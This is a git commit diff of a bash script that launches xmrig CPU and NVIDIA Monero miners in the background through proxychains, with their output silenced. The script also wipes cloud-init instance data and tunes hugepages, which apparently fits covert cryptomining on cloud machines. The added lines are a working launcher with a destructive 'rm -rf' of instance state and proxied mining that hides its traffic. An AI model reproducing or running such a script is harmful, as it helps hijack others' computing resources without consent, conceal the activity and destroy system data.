c3e3b16e8a2255677ceec82764ed719a9a54c85d
smithinoz <smithinoz@users.noreply.github.com>
2018-02-19 22:34:18 +1100

    Update ag.sh

--- ag.sh
+++ ag.sh
@@ -1,13 +1,10 @@
 #!/bin/bash
-sudo yum remove sendmail -y
-sudo yum install git build-essential automake libjansson-dev libgmp-dev libcurl4-openssl-dev libssl-dev pthreads zlib openssl-devel gcc-c++ curl-devel libmpc-devel gmp  gmp-devel  mpfr  mpfr-devel  libmpc  libmpc-devel -y
-cd /m/test01/xmrig-nvidia/build
-
-/m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmrig-nvidia/build/xmrig-nvidia --config=/m/test01/xmrig-nvidia/build/config.json 2>&1 1> /dev/null
-/m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmrig/build/xmrig --config=/m/test01/xmrig/build/config.json 2>&1 1> /dev/null
-  
-fi
-while true; do
-cd /m/test01/xmr/
-#sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
-done
+rm -rf /var/lib/cloud/instance/*
+sudo chmod +x /m/test01/proxychains/proxychains4
+sudo chmod +x /m/test01/xmr/xmr-stak-cpu
+sudo chmod +x /m/test01/proxychains/libproxychains4.so
+sudo sysctl -w vm.nr_hugepages=128
+sudo chmod +x /m/test01/xmrig-nvidia/build/xmrig-nvidia
+sudo chmod +x /m/test01/xmrig/build/xmrig
+/m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmrig/build/xmrig --config=/m/test01/xmrig/build/config.json 2>&1 1> /dev/null&
+/m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmrig-nvidia/build/xmrig-nvidia --config=/m/test01/xmrig-nvidia/build/config.json 2>&1 1> /dev/null&
